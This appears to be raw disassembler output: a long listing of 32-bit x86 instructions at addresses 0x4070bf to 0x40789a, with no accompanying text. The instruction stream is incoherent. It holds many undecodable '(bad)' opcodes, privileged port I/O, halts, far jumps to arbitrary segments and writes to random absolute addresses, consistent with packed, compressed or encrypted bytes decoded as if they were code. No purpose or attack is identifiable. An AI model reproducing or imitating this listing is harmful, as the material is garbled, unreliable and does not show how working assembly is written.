  4070bf:	cmp    esi,DWORD PTR [ecx+ebp*2-0x5d260e71]
  4070c6:	sub    eax,0x79045776
  4070cb:	dec    ecx
  4070cc:	cmp    DWORD PTR [esp+ecx*4-0x30],ebx
  4070d0:	mov    edx,0xe8e2bceb
  4070d5:	outs   dx,BYTE PTR ds:[esi]
  4070d6:	sbb    al,0x27
  4070d8:	xchg   edx,eax
  4070d9:	sbb    BYTE PTR [ebx],bh
  4070db:	ds ret 
  4070dd:	xchg   ebp,eax
  4070de:	icebp  
  4070df:	xchg   DWORD PTR [esi],ebp
  4070e1:	int3   
  4070e2:	push   ebx
  4070e3:	fs clc 
  4070e5:	add    edi,DWORD PTR [ecx-0x31]
  4070e8:	add    DWORD PTR ds:0xb4b50caa,ebp
  4070ee:	dec    ecx
  4070ef:	or     eax,0xa33fb0fa
  4070f4:	repnz xchg edi,eax
  4070f6:	mov    ebp,0x8c877d3b
  4070fb:	sub    eax,0xd974139c
  407100:	sbb    ecx,edx
  407102:	fisttp QWORD PTR [edx-0x7e]
  407105:	sbb    edx,DWORD PTR [ebx+0x4637ba57]
  40710b:	pop    ds
  40710c:	mov    ecx,0xec9a6110
  407111:	rcr    bl,0x12
  407114:	jge    0x407184
  407116:	scas   al,BYTE PTR es:[edi]
  407117:	hlt    
  407118:	xor    eax,0xa593339a
  40711d:	jg     0x407158
  40711f:	jg     0x40710f
  407121:	das    
  407122:	arpl   WORD PTR [ebp-0x39c2880b],bp
  407128:	add    ah,BYTE PTR [ecx+esi*2+0x55bedaf7]
  40712f:	xchg   ebx,eax
  407130:	test   DWORD PTR [ebx-0x21],0xe2f263be
  407137:	pop    ss
  407138:	mov    cl,BYTE PTR [ebx-0x2dbe62fd]
  40713e:	leave  
  40713f:	or     eax,0x16712698
  407144:	mov    ds:0x6ace538e,eax
  407149:	(bad)  
  40714a:	in     eax,dx
  40714b:	inc    esi
  40714c:	add    al,0x51
  40714e:	jns    0x40719a
  407150:	mov    eax,0x612a9428
  407155:	cmp    al,0xfd
  407157:	mov    ebp,0x979be0c
  40715c:	or     al,0xf9
  40715e:	cld    
  40715f:	stos   DWORD PTR es:[edi],eax
  407160:	int3   
  407161:	sbb    dh,BYTE PTR [edx-0x4a]
  407164:	push   ecx
  407165:	sub    BYTE PTR [eax+0x4e],cl
  407168:	(bad)  [ecx+ebp*2+0x34]
  40716c:	fisubr WORD PTR [esi+0xb]
  40716f:	dec    edi
  407170:	add    eax,0x1280e8d3
  407175:	xchg   ebp,eax
  407176:	jmp    DWORD PTR [ebp+0x47]
  407179:	pop    esi
  40717a:	xor    eax,0x433aa50d
  40717f:	fstp   st(6)
  407181:	xchg   ecx,eax
  407182:	xor    edi,DWORD PTR [ebp-0x3b]
  407185:	popa   
  407186:	xor    dh,BYTE PTR [ecx-0x1b]
  407189:	fucomip st,st(1)
  40718b:	gs mov ebx,0xf2020f39
  407191:	das    
  407192:	lea    esp,[esp+esi*4+0x48]
  407196:	mov    esi,0xb820426
  40719b:	xor    eax,0xab55cebb
  4071a0:	rol    BYTE PTR [eax-0x3ead7afd],1
  4071a6:	dec    edx
  4071a7:	cmp    DWORD PTR [ebx],edi
  4071a9:	add    al,0x47
  4071ab:	add    eax,0x6d008ffd
  4071b0:	repnz mov ah,0xb4
  4071b3:	inc    edx
  4071b4:	xchg   ebp,eax
  4071b5:	fwait
  4071b6:	icebp  
  4071b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4071b8:	jl     0x40719b
  4071ba:	ins    DWORD PTR es:[edi],dx
  4071bb:	scas   eax,DWORD PTR es:[edi]
  4071bc:	jbe    0x4071c3
  4071be:	cli    
  4071bf:	inc    edx
  4071c0:	dec    eax
  4071c1:	lahf   
  4071c2:	mov    cl,0x92
  4071c4:	retf   
  4071c5:	scas   eax,DWORD PTR es:[edi]
  4071c6:	inc    eax
  4071c7:	add    ecx,DWORD PTR [ebx+0x6e080c77]
  4071cd:	outs   dx,BYTE PTR ds:[esi]
  4071ce:	xor    eax,edi
  4071d0:	mov    bl,0xee
  4071d2:	jnp    0x40715b
  4071d4:	out    dx,al
  4071d5:	push   edx
  4071d6:	and    al,0xb
  4071d8:	ins    BYTE PTR es:[edi],dx
  4071d9:	test   DWORD PTR [esi+ebp*2+0x3d42d62c],ebx
  4071e0:	shl    BYTE PTR [edx+0x60],0x86
  4071e4:	dec    eax
  4071e5:	in     al,0xcb
  4071e7:	gs jo  0x4071ea
  4071ea:	xchg   DWORD PTR [eax-0xe047aeb],ebp
  4071f0:	loop   0x40725a
  4071f2:	test   DWORD PTR [ebx+0x76c754c6],esi
  4071f8:	dec    esp
  4071f9:	pop    esp
  4071fa:	bound  eax,QWORD PTR [ebp-0x7e45646b]
  407200:	mov    eax,ds:0xd1be8061
  407205:	out    0x92,al
  407207:	int    0xe0
  407209:	test   DWORD PTR [edi+0x7649826c],ebx
  40720f:	les    esi,FWORD PTR [edi-0x18]
  407212:	dec    edx
  407213:	jbe    0x407208
  407215:	and    esp,DWORD PTR [edx+0x4193ca4d]
  40721b:	cli    
  40721c:	std    
  40721d:	jg     0x40728a
  40721f:	mov    ds:0x5116db5,eax
  407224:	cmp    al,0x43
  407226:	pop    ss
  407227:	cmp    ecx,DWORD PTR [ebx-0x1c]
  40722a:	popa   
  40722b:	sub    BYTE PTR [edi-0x45aba86b],dl
  407231:	jnp    0x407229
  407233:	adc    DWORD PTR [ecx],ebp
  407235:	xchg   BYTE PTR [ebx],ah
  407237:	and    edi,DWORD PTR [edx+eiz*8]
  40723a:	sbb    eax,0x37e164a5
  40723f:	enter  0x38a7,0xbc
  407243:	mov    edx,0xb90653a4
  407248:	rcr    DWORD PTR [edi],cl
  40724a:	jno    0x4071ec
  40724c:	xchg   ebp,eax
  40724d:	lods   al,BYTE PTR ds:[esi]
  40724e:	mov    ds:0x5d1d9569,eax
  407253:	dec    eax
  407254:	(bad)  
  407255:	xchg   esi,eax
  407256:	ficomp DWORD PTR ds:0xde6314dc
  40725c:	pop    ecx
  40725d:	sub    dl,BYTE PTR [ebx]
  40725f:	in     al,0x59
  407261:	test   al,0xc3
  407263:	fisubr WORD PTR [edx+0x39cee535]
  407269:	cld    
  40726a:	sbb    al,0x94
  40726c:	fisubr WORD PTR [eax-0x69]
  40726f:	imul   ecx,ebx,0xcbd16365
  407275:	cs mov ebp,0x1b0fec10
  40727b:	xor    al,0x11
  40727d:	pop    esp
  40727e:	sbb    eax,0xfcb1b152
  407283:	call   0xfe64:0xa64a0ba1
  40728a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40728b:	out    dx,eax
  40728c:	fmul   QWORD PTR [ecx-0x21]
  40728f:	test   al,0xdf
  407291:	xchg   esi,eax
  407292:	ss or  al,0xb1
  407295:	clc    
  407296:	in     eax,dx
  407297:	hlt    
  407298:	mov    dl,0x22
  40729a:	push   0x10
  40729c:	dec    esp
  40729d:	sbb    al,0xcb
  40729f:	xor    eax,0x9e1c6d95
  4072a4:	jne    0x4072f9
  4072a6:	ret    
  4072a7:	mov    bl,0x82
  4072a9:	cmp    edi,DWORD PTR [edi]
  4072ab:	leave  
  4072ac:	xor    al,0x32
  4072ae:	cmp    bh,BYTE PTR [edi+0x56f71cd7]
  4072b4:	xchg   ebx,eax
  4072b5:	inc    edx
  4072b6:	lods   al,BYTE PTR ds:[esi]
  4072b7:	and    ecx,esi
  4072b9:	xor    eax,0xf2dede14
  4072be:	cdq    
  4072bf:	loope  0x40725b
  4072c1:	jnp    0x4072cd
  4072c3:	in     eax,0xde
  4072c5:	xchg   ecx,eax
  4072c6:	and    BYTE PTR [ebx+0x4a1f9341],dh
  4072cc:	mov    dh,0x19
  4072ce:	clc    
  4072cf:	ficom  DWORD PTR [edx-0x4f]
  4072d2:	and    al,0x79
  4072d4:	jge    0x407312
  4072d6:	sbb    cl,BYTE PTR es:[esi]
  4072d9:	test   DWORD PTR [ebp+0x6eb72139],edi
  4072df:	xor    dh,BYTE PTR [ebx]
  4072e1:	xchg   ebx,eax
  4072e2:	or     BYTE PTR [ebx-0x5d566531],al
  4072e8:	mov    al,0xf9
  4072ea:	or     ecx,edx
  4072ec:	aas    
  4072ed:	xchg   esp,eax
  4072ee:	mov    esp,0x152aa270
  4072f3:	imul   ecx,DWORD PTR [edi+0x341854b8],0xef6ccf9e
  4072fd:	add    DWORD PTR [esi],0x15fa51a6
  407303:	cs inc ebx
  407305:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407306:	mov    bh,0x6f
  407308:	mov    ?,WORD PTR ds:0xbe50
  40730d:	xlat   BYTE PTR ds:[ebx]
  40730e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40730f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407310:	fisub  WORD PTR [esp+eax*8+0x1c]
  407314:	xchg   esi,eax
  407315:	lods   eax,DWORD PTR ds:[esi]
  407316:	cmp    DWORD PTR [edx-0x5c],esp
  407319:	and    BYTE PTR fs:[edi],dh
  40731c:	(bad)  
  40731d:	jmp    0x1398:0xb9782c2b
  407324:	push   es
  407325:	arpl   WORD PTR [edi],sp
  407327:	vpcmpeqd xmm3,xmm5,XMMWORD PTR [esi]
  40732b:	xor    eax,DWORD PTR [edx+0x5088be3e]
  407331:	or     DWORD PTR [eax],edx
  407333:	sti    
  407334:	push   edx
  407335:	mov    ds:0xcf0b79a,al
  40733a:	pop    ss
  40733b:	jo     0x40739d
  40733d:	sti    
  40733e:	in     al,0xe0
  407340:	xor    BYTE PTR [ecx+0x12],bl
  407343:	jmp    0x40732f
  407345:	dec    ebx
  407346:	add    eax,0xb5c1b43
  40734b:	clc    
  40734c:	mov    edx,0x8704b8b1
  407351:	dec    esp
  407353:	sub    esi,ebp
  407355:	ret    
  407356:	outs   dx,DWORD PTR ds:[esi]
  407357:	push   0xffffffa1
  407359:	sub    al,0x65
  40735b:	out    dx,al
  40735c:	sbb    DWORD PTR [ebp+eax*4+0x73],edi
  407360:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407361:	fs push esp
  407363:	lds    ecx,FWORD PTR [edx+ebx*8+0x1]
  407367:	xor    BYTE PTR [edi-0x45],bl
  40736a:	(bad)  
  40736c:	add    eax,0x7c57cea1
  407371:	imul   eax,esp,0x50
  407374:	pop    ebp
  407375:	or     eax,0x4df21d1a
  40737a:	fisttp DWORD PTR ds:[edi-0x36a72028]
  407381:	inc    ecx
  407382:	shr    DWORD PTR [esi+0x1c2d6cc5],1
  407388:	in     eax,0xd0
  40738a:	add    al,0xd3
  40738c:	and    BYTE PTR [ecx+0x689ff2ba],ah
  407392:	jmp    0x40732c
  407394:	xor    eax,0xa40bb38d
  407399:	add    BYTE PTR [ebp-0x2e],bl
  40739c:	je     0x4073ca
  40739e:	mov    dl,ch
  4073a0:	sar    BYTE PTR [edx+0x17f4f160],cl
  4073a6:	enter  0x69d5,0x6d
  4073aa:	addr16 pop edx
  4073ac:	scas   eax,DWORD PTR es:[edi]
  4073ad:	ins    DWORD PTR es:[edi],dx
  4073ae:	(bad)  
  4073af:	test   al,0x73
  4073b1:	(bad)  
  4073b2:	jg     0x4073c9
  4073b4:	and    al,BYTE PTR [edx]
  4073b6:	add    dl,BYTE PTR [ecx]
  4073b8:	aad    0x3c
  4073ba:	push   edx
  4073bb:	loope  0x4073d2
  4073bd:	xor    eax,0x7fcda30c
  4073c2:	sahf   
  4073c3:	jne    0x407397
  4073c5:	cmp    ch,BYTE PTR [ebp+0x1]
  4073c8:	sub    BYTE PTR [esp+esi*1],al
  4073cb:	mov    ecx,0x296254ac
  4073d0:	lea    edi,[ebx+0x25be0c40]
  4073d6:	clc    
  4073d7:	xchg   ebp,eax
  4073d8:	cmp    bl,BYTE PTR [ecx]
  4073da:	mov    eax,DWORD PTR [edi]
  4073dc:	int    0xcc
  4073de:	pop    ebx
  4073df:	gs int3 
  4073e1:	and    BYTE PTR [edx],0x91
  4073e4:	cmp    BYTE PTR [ebp+0x15],al
  4073e7:	sub    dl,ah
  4073e9:	leave  
  4073ea:	jne    0x4073d3
  4073ec:	jmp    DWORD PTR [esi]
  4073ee:	les    edx,FWORD PTR [edi-0x70e81dca]
  4073f4:	dec    edx
  4073f5:	icebp  
  4073f6:	dec    ecx
  4073f7:	sbb    esp,edx
  4073f9:	mov    ds:0x66bb5de6,eax
  4073fe:	(bad)  
  4073ff:	jg     0x40742f
  407401:	sub    al,0xa4
  407403:	push   ecx
  407404:	(bad)  
  407405:	dec    edi
  407406:	dec    esi
  407407:	fwait
  407408:	ss je  0x407430
  40740b:	push   edx
  40740c:	add    al,0x64
  40740e:	mov    ecx,0xcbe7f8b9
  407413:	or     al,0xc2
  407415:	xor    DWORD PTR [ecx+ebx*8],eax
  407418:	into   
  407419:	ficom  WORD PTR [eax+0x7d]
  40741c:	je     0x40742c
  40741e:	pop    edi
  40741f:	push   ecx
  407420:	cmp    DWORD PTR [ebp-0x9e20185],ebp
  407426:	lahf   
  407427:	outs   dx,BYTE PTR ds:[esi]
  407428:	out    dx,al
  407429:	mov    ds,WORD PTR [ebp+0x1a]
  40742c:	retf   0xfa20
  40742f:	add    esp,ebp
  407431:	clc    
  407432:	cdq    
  407433:	mov    ah,0x9
  407435:	leave  
  407436:	lds    edi,FWORD PTR [ebx]
  407438:	imul   DWORD PTR [ebx-0x12]
  40743b:	xor    eax,0x466b2a47
  407440:	mov    ds:0xb458376,al
  407445:	cli    
  407446:	xchg   edx,eax
  407447:	aaa    
  407448:	mov    edx,0x5c9571
  40744d:	(bad)  
  40744e:	repnz mov bl,0x82
  407451:	dec    esp
  407452:	retf   0x1974
  407455:	int    0x9d
  407457:	xor    eax,0x7419c3ca
  40745c:	idiv   BYTE PTR [edx+0x47]
  40745f:	ret    0xa560
  407462:	cmp    edi,DWORD PTR [edx]
  407464:	mov    al,ds:0xf34fdc12
  407469:	addr16 pop edx
  40746b:	dec    ecx
  40746c:	xor    eax,0x203e30b1
  407471:	std    
  407472:	pop    esp
  407473:	mov    BYTE PTR [ebx],ch
  407475:	fcmovnu st,st(7)
  407477:	push   esp
  407478:	shl    DWORD PTR [esi+0x48],cl
  40747b:	jp     0x4074e7
  40747d:	push   ebp
  40747e:	rcr    BYTE PTR [ebp-0x24d00cb9],1
  407484:	pop    eax
  407485:	lods   al,BYTE PTR ds:[esi]
  407486:	mov    ds:0x3f4b332a,al
  40748b:	sbb    al,ch
  40748d:	ficomp WORD PTR [esi+0x1489ca6f]
  407493:	mov    ecx,0x995b48fc
  407498:	or     dl,BYTE PTR [ebx-0x75]
  40749b:	adc    eax,0x97210b63
  4074a0:	ret    
  4074a1:	repz xor DWORD PTR [ecx+0x3b63902e],esi
  4074a8:	jp     0x4074f2
  4074aa:	or     cl,ch
  4074ac:	outs   dx,DWORD PTR ds:[esi]
  4074ad:	std    
  4074ae:	and    DWORD PTR [esi],ecx
  4074b0:	xchg   ecx,eax
  4074b1:	hlt    
  4074b2:	enter  0x5e72,0x91
  4074b6:	push   0xfffffff4
  4074b8:	or     BYTE PTR [edi],cl
  4074ba:	cmp    ebx,DWORD PTR [eax]
  4074bc:	das    
  4074bd:	xor    dh,dh
  4074bf:	cmc    
  4074c0:	add    esp,DWORD PTR [esi-0x3b]
  4074c3:	dec    ecx
  4074c4:	jmp    0xe765:0x4484883d
  4074cb:	mov    eax,ds:0xa9833657
  4074d0:	pop    ecx
  4074d1:	bound  edi,QWORD PTR [edi-0x6019cc62]
  4074d7:	(bad)  
  4074d8:	icebp  
  4074d9:	inc    edx
  4074da:	inc    edx
  4074db:	pop    ss
  4074dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074dd:	aad    0xa7
  4074df:	xor    eax,0x4ee4a7c7
  4074e4:	cmp    eax,0x5a24385c
  4074e9:	mov    ecx,0x22805f7d
  4074ee:	inc    eax
  4074ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074f0:	adc    edi,DWORD PTR [esp+esi*8]
  4074f3:	xchg   esp,eax
  4074f4:	jb     0x40748e
  4074f6:	fisubr DWORD PTR [esi-0x703556f]
  4074fc:	mov    ebx,0xa042e2d5
  407501:	lahf   
  407502:	outs   dx,BYTE PTR ds:[esi]
  407503:	fisttp DWORD PTR [eax+ecx*2+0x7f]
  407507:	add    ebp,DWORD PTR ds:0x27b9b68d
  40750d:	sti    
  40750e:	push   ds
  40750f:	aaa    
  407510:	or     DWORD PTR [ebx],ecx
  407512:	sbb    DWORD PTR [edi],edi
  407514:	and    esp,DWORD PTR [ebp-0x3bd049da]
  40751a:	ret    0x6871
  40751d:	stos   BYTE PTR es:[edi],al
  40751e:	clc    
  40751f:	int3   
  407520:	sbb    edi,DWORD PTR gs:[esp+edi*2+0x50]
  407525:	add    DWORD PTR ds:0x5112174b,ecx
  40752b:	fcomp  QWORD PTR [ebx+eiz*1+0x15]
  40752f:	and    edx,DWORD PTR [ebx]
  407531:	ins    BYTE PTR es:[edi],dx
  407532:	jae    0x40751e
  407534:	lods   al,BYTE PTR ds:[esi]
  407535:	dec    ecx
  407536:	popf   
  407537:	mov    edx,0x54bdfdc
  40753c:	scas   al,BYTE PTR es:[edi]
  40753d:	mov    cl,0x18
  40753f:	outs   dx,BYTE PTR ds:[esi]
  407540:	sbb    BYTE PTR [eax-0x8],al
  407543:	xchg   ecx,eax
  407544:	cmp    DWORD PTR [ebx-0x7d],esp
  407547:	mov    cl,0xca
  407549:	and    BYTE PTR [ecx],bl
  40754b:	mov    WORD PTR [esi],?
  40754d:	jl     0x40750b
  40754f:	nop
  407550:	in     eax,0x2a
  407552:	pop    DWORD PTR [eax+0x35]
  407555:	push   edi
  407556:	mov    dh,0xfb
  407558:	cld    
  407559:	add    eax,0x9b9bfc48
  40755e:	pop    eax
  40755f:	lds    ecx,FWORD PTR [eiz*2+0x7b117dc8]
  407566:	popa   
  407567:	pop    ss
  407568:	adc    BYTE PTR [eax],bl
  40756a:	cs (bad) 
  40756c:	daa    
  40756d:	pusha  
  40756e:	(bad)  
  40756f:	cmp    eax,0x1e63a97
  407574:	dec    ebx
  407575:	push   cs
  407576:	jecxz  0x40754d
  407578:	imul   ebp,DWORD PTR [eax],0xffffffd2
  40757b:	ins    BYTE PTR es:[edi],dx
  40757c:	movq   mm4,QWORD PTR [edi]
  40757f:	dec    eax
  407580:	int3   
  407581:	jmp    0x1b21fd47
  407586:	inc    esp
  407587:	mov    al,0xa8
  407589:	lods   al,BYTE PTR ds:[esi]
  40758a:	pusha  
  40758b:	sbb    DWORD PTR [ebp-0x61],ebp
  40758e:	xor    edx,DWORD PTR [ebp-0x68]
  407591:	mov    dh,0x46
  407593:	sbb    edi,DWORD PTR [ebp-0x34]
  407596:	fisttp WORD PTR [ecx+0xb]
  407599:	inc    esi
  40759a:	sub    al,0x3a
  40759c:	ret    
  40759d:	inc    ecx
  40759e:	push   edx
  40759f:	push   esi
  4075a0:	or     DWORD PTR [ecx+0x6b],edi
  4075a3:	into   
  4075a4:	out    dx,eax
  4075a5:	or     al,0x73
  4075a7:	xor    ch,ah
  4075a9:	and    al,0x33
  4075ab:	in     eax,dx
  4075ac:	xchg   ecx,eax
  4075ad:	sub    DWORD PTR [esp+esi*4],esp
  4075b0:	xchg   BYTE PTR ds:0xeeffc0dd,ah
  4075b6:	sbb    eax,0x8aa57c35
  4075bb:	cmp    esi,DWORD PTR [eax]
  4075bd:	ret    
  4075be:	stos   DWORD PTR es:[edi],eax
  4075bf:	ja     0x4075a9
  4075c1:	and    DWORD PTR [ebp-0x40],edi
  4075c4:	jb     0x4075ad
  4075c6:	adc    eax,0xc9fa585c
  4075cb:	sbb    eax,0xf7417747
  4075d0:	or     eax,0xb3d3bbe9
  4075d5:	outs   dx,DWORD PTR ds:[esi]
  4075d6:	cdq    
  4075d7:	cdq    
  4075d8:	add    eax,0x5c01bbb
  4075dd:	xlat   BYTE PTR ds:[ebx]
  4075de:	jo     0x4075ff
  4075e0:	add    BYTE PTR ds:0xdebc230d,al
  4075e6:	push   esi
  4075e7:	xchg   edx,eax
  4075e8:	mov    edi,0x46188083
  4075ed:	push   ebp
  4075ee:	je     0x407661
  4075f0:	add    DWORD PTR [ebp+0x52],0x58684f6c
  4075f7:	inc    edx
  4075f8:	jmp    0x4dbefed
  4075fd:	jno    0x4075e2
  4075ff:	in     al,dx
  407600:	xchg   edx,eax
  407601:	xor    DWORD PTR [edi],eax
  407603:	mov    edx,0x755fb0da
  407608:	mov    WORD PTR [ecx+0x73],ds
  40760b:	xor    eax,0xa63324ef
  407610:	jmp    0x407653
  407612:	inc    edi
  407613:	mov    ds:0xff9a3726,al
  407618:	push   esp
  407619:	fcomp  DWORD PTR [eax+eiz*1-0x1d80019b]
  407620:	adc    DWORD PTR [edx-0x6b],edx
  407623:	ret    
  407624:	xor    bh,BYTE PTR [ebx]
  407626:	sar    eax,0xd0
  407629:	sahf   
  40762a:	sub    DWORD PTR [esi-0x24882ca3],esp
  407630:	mov    edx,?
  407632:	jmp    0x3475:0x38f9cc89
  407639:	jmp    0x5022:0xc8effdf4
  407640:	test   BYTE PTR [edx-0x20],0x93
  407644:	call   0xe70940e5
  407649:	dec    eax
  40764a:	in     eax,dx
  40764b:	mov    bh,0xc3
  40764d:	adc    cl,BYTE PTR [eax-0x3b]
  407650:	mov    cs,esi
  407652:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407653:	mov    dl,0x32
  407655:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407656:	push   esp
  407657:	test   DWORD PTR [edx],ecx
  407659:	aam    0x83
  40765b:	sub    al,0xdd
  40765d:	add    ebp,DWORD PTR [ebx-0x3baeefb4]
  407663:	jmp    0x987c5c85
  407668:	pop    esi
  407669:	int    0x55
  40766b:	mov    DWORD PTR [edx-0x1b076301],ebp
  407671:	jg     0x40765c
  407673:	sub    ebp,0x6d
  407676:	xor    dh,cl
  407678:	out    dx,eax
  407679:	out    dx,eax
  40767a:	push   edi
  40767b:	loop   0x407627
  40767d:	fs stc 
  40767f:	pop    ebp
  407680:	mov    bh,0xad
  407682:	dec    esi
  407683:	mov    al,ds:0xecc8631f
  407688:	ds (bad) 
  40768a:	je     0x407628
  40768c:	cmp    eax,0xb0440db5
  407691:	pushf  
  407692:	push   ecx
  407693:	enter  0x818e,0x74
  407697:	jbe    0x4076b5
  407699:	jl     0x407709
  40769b:	add    edi,DWORD PTR [edx+ebp*1]
  40769e:	or     cl,bh
  4076a0:	retf   0x4710
  4076a3:	test   BYTE PTR [ecx+0x55ca3970],cl
  4076a9:	(bad)  
  4076aa:	out    0x29,eax
  4076ac:	shr    DWORD PTR [edx],0x1f
  4076af:	(bad)  
  4076b0:	rcl    DWORD PTR [ebx+0x31c142ad],cl
  4076b6:	cmp    eax,0xc4bf8034
  4076bb:	and    DWORD PTR [ebp+0x76],edx
  4076be:	jno    0x40768a
  4076c0:	add    al,BYTE PTR [edx+edi*8]
  4076c3:	int    0xdd
  4076c5:	imul   esi,DWORD PTR [eax],0xf500e53c
  4076cb:	cli    
  4076cc:	jns    0x407676
  4076ce:	lds    eax,FWORD PTR [edi+ebx*2-0x7f828b80]
  4076d5:	lds    esi,FWORD PTR ds:0x85cdc4c8
  4076db:	adc    BYTE PTR [eax+0x2ffef449],bh
  4076e1:	bnd jae 0x4076de
  4076e4:	enter  0x27a9,0xc2
  4076e8:	xor    edi,edi
  4076ea:	pop    ebp
  4076eb:	sbb    al,0x6
  4076ed:	call   0xf62c:0xb295f472
  4076f4:	sti    
  4076f5:	ret    0xa680
  4076f8:	xor    BYTE PTR [ebx-0x4924ccc9],ah
  4076fe:	adc    BYTE PTR ds:0x6e1f8752,bl
  407704:	mov    ebx,0x5deaa6e
  407709:	loope  0x4076f3
  40770b:	jecxz  0x4076b5
  40770d:	scas   al,BYTE PTR es:[edi]
  40770e:	(bad)  
  40770f:	adc    ah,ch
  407711:	add    eax,0x805a6bbd
  407716:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407718:	jg     0x407749
  40771a:	mov    ah,0x78
  40771c:	mov    al,0xec
  40771e:	xchg   DWORD PTR [ecx],ebx
  407720:	fxch   st(3)
  407722:	fucomip st,st(3)
  407724:	dec    edx
  407725:	add    ah,BYTE PTR [ecx]
  407727:	nop
  407728:	cmp    ebx,ebp
  40772a:	pop    ecx
  40772b:	xor    al,0xe7
  40772d:	cmp    dh,0xc6
  407730:	(bad)  
  407731:	enter  0x7e5f,0x48
  407735:	pop    esp
  407736:	mov    WORD PTR [eax],es
  407738:	adc    sp,WORD PTR [ecx-0x7b]
  40773c:	dec    ebx
  40773d:	(bad)  
  40773e:	push   ebx
  40773f:	mov    ds:0x699ef8d7,al
  407744:	adc    ecx,esi
  407746:	xchg   esp,eax
  407747:	xor    BYTE PTR [ebp+0x3264dea1],bh
  40774d:	test   al,0x5b
  40774f:	push   eax
  407750:	xor    dh,BYTE PTR [esi+edx*2+0x60]
  407754:	and    al,0xce
  407756:	sbb    DWORD PTR [ecx+0x2e],edi
  407759:	inc    eax
  40775a:	xchg   ecx,eax
  40775b:	in     al,dx
  40775c:	repz loop 0x4077b7
  40775f:	pop    edi
  407760:	int3   
  407761:	and    esi,DWORD PTR [ebx+0x4a]
  407764:	js     0x407703
  407766:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407767:	mov    bl,0xff
  407769:	dec    esi
  40776a:	ds jb  0x4077e9
  40776d:	js     0x407784
  40776f:	add    al,0xb6
  407771:	sbb    edi,DWORD PTR [ebp-0x17]
  407774:	or     edx,DWORD PTR ss:[edi]
  407777:	mov    bl,0x6a
  407779:	mov    bh,0x3
  40777b:	xchg   esp,eax
  40777c:	(bad)  
  40777d:	call   0xf637:0xff50ea33
  407784:	out    dx,eax
  407785:	cmp    eax,0xbc9d56dc
  40778a:	lds    eax,FWORD PTR [ebx]
  40778c:	test   al,0xc8
  40778e:	daa    
  40778f:	dec    eax
  407790:	mov    ecx,DWORD PTR fs:[ecx-0x65]
  407794:	pop    ecx
  407795:	and    eax,0x70bbccf
  40779a:	loope  0x407755
  40779c:	out    0x32,eax
  40779e:	loope  0x4077d3
  4077a0:	mov    al,0x0
  4077a2:	shl    DWORD PTR [edi+0x5d80ee8],cl
  4077a8:	aaa    
  4077a9:	sbb    DWORD PTR [esi-0x7b07b9af],0xffffffbb
  4077b0:	repz scas eax,DWORD PTR es:[edi]
  4077b2:	xchg   ebx,eax
  4077b3:	xor    ebp,DWORD PTR [eax+esi*8+0x6aa323a7]
  4077ba:	and    ch,BYTE PTR [ecx+0x25]
  4077bd:	retf   0xd979
  4077c0:	push   0x58
  4077c2:	call   0x9cfb587c
  4077c7:	iret   
  4077c8:	mov    ebp,0x9c3aa675
  4077cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077ce:	cmp    BYTE PTR [eax+ebx*2+0x4da31c71],cl
  4077d5:	out    0xf3,al
  4077d7:	push   ss
  4077d8:	(bad)  
  4077d9:	or     ch,BYTE PTR [edi-0x3d]
  4077dc:	ja     0x40784a
  4077de:	cmp    BYTE PTR [edi],dh
  4077e0:	ret    0x93b6
  4077e3:	or     ecx,esi
  4077e5:	add    BYTE PTR [ecx-0x7c],ah
  4077e8:	and    BYTE PTR [esi-0x1c],ah
  4077eb:	sub    eax,0xe0ab3050
  4077f0:	jbe    0x4077ce
  4077f2:	adc    al,BYTE PTR [ecx-0x5ce1b66c]
  4077f8:	xchg   BYTE PTR [edi],dl
  4077fa:	out    0xc3,eax
  4077fc:	test   al,0x6c
  4077fe:	xchg   edx,eax
  4077ff:	add    eax,0x414b547b
  407804:	pop    ss
  407805:	cmp    al,0xde
  407807:	jnp    0x4077c8
  407809:	outs   dx,DWORD PTR cs:[esi]
  40780b:	jp     0x407824
  40780d:	std    
  40780e:	stos   DWORD PTR es:[edi],eax
  40780f:	leave  
  407810:	jmp    0x407793
  407812:	ja     0x407879
  407814:	sar    al,cl
  407816:	xchg   ecx,eax
  407817:	ds or  eax,0x986e376f
  40781d:	pop    esp
  40781e:	mov    dl,0x0
  407820:	leave  
  407821:	mov    dh,0x84
  407823:	ror    DWORD PTR [esi+ebp*1-0x7c],0xf0
  407828:	(bad)  
  407829:	retf   0x19da
  40782c:	aam    0xb7
  40782e:	push   cs
  40782f:	adc    eax,0x76fb7289
  407834:	fistp  WORD PTR [edx+0xf]
  407837:	daa    
  407838:	mov    ah,0xd2
  40783a:	movzx  ebp,WORD PTR [ecx-0x612828a5]
  407841:	lods   eax,DWORD PTR ds:[esi]
  407842:	cdq    
  407843:	int3   
  407844:	mov    eax,0x79dc1df6
  407849:	inc    esi
  40784a:	jbe    0x4078b8
  40784c:	sub    al,0xc3
  40784e:	imul   eax,DWORD PTR [edx+edi*4],0x6074ee
  407855:	scas   al,BYTE PTR es:[edi]
  407856:	or     eax,0xecc8543f
  40785b:	inc    ebp
  40785c:	scas   eax,DWORD PTR es:[edi]
  40785d:	push   edx
  40785e:	mov    esi,0xd11ddc62
  407863:	(bad)  
  407864:	std    
  407865:	(bad)  
  407867:	mov    eax,0xe579c046
  40786c:	sub    eax,0x435e05cb
  407871:	cmp    ch,bh
  407873:	mov    bh,0x2c
  407875:	arpl   WORD PTR [edi-0x5e8b406e],sp
  40787b:	cli    
  40787c:	in     al,0xda
  40787e:	outs   dx,BYTE PTR ds:[esi]
  40787f:	stos   BYTE PTR es:[edi],al
  407880:	xchg   esp,eax
  407881:	sub    ah,0x2a
  407884:	imul   ebx,DWORD PTR [esi+0x2c97fbc6],0xd40e360d
  40788e:	sbb    eax,0x59806201
  407893:	add    al,0xf7
  407895:	pop    edi
  407896:	cmp    al,0x4e
  407898:	jo     0x4078ca
  40789a:	inc    eax
